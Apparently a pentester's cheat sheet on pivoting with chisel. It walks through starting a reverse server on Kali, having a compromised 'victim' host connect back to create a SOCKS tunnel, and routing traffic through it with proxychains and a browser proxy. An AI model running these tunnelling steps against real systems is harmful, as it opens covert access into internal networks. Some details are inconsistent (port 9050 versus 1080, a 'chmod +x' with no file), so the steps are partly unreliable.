
### ==🔵Chisel with SOCKS (for dynamic port forwarding) :==

==🔵Download for Linux victim : ==
```
https://github.com/jpillora/chisel/releases
```
Download `chisel_1.13.0_linux_amd64.gz` then `gunzip`
Then if you have a linux victim , tranfer it to there , then give permissions
```
chmod +x
#on the victim linux
```

==🔵Download for Windows victim :==
```
https://github.com/jpillora/chisel/releases  # windows 
chisel_1.12.0_windows_amd64.zip
```

==🔵On kali :==
```
sudo apt install chisel     #kali linux - attacker 
```
then :
```
sudo gedit /etc/proxychains.conf
add line in last : socks5 127.0.0.1 9050
```
remove the socks4 line if present in last

==🔵Attacker / Kali — start server : ==
```
chisel server -p 8000 --reverse
```

==🔵On victim linux : connect back to Kali and create reverse forward : ==
```
./chisel client <KALI_IP>:8000 R:socks
#then you can do crtl+c now on victim so you can run any commands on the victim as well side by side, the chisel conenction will still be there
```

==🔵on windows victim : ==
```
chisel.exe client <KALI_IP>:8000 R:<SOCKS_PORT>:socks
#chisel.exe client 10.10.10.5:8000 R:9050:socks
```

==🔵Now curl the website :==
```
proxychains -q curl 10.200.85.150
```

==🔵To do it in browser : ==
In foxy proxy browser extension : 
add new proxy :
```
Title : socks
Type : SOCKS5
Hostname : 127.0.0.1
Port : 1080
```
then turn on the proxy and go to the url

==🔴IF YOU WANT TO USE OTHER TABS OR SERACH SOMETHING ON GOOGLE 
YOU HAVE TO FIRST TURN OFF YOUR PROXY==
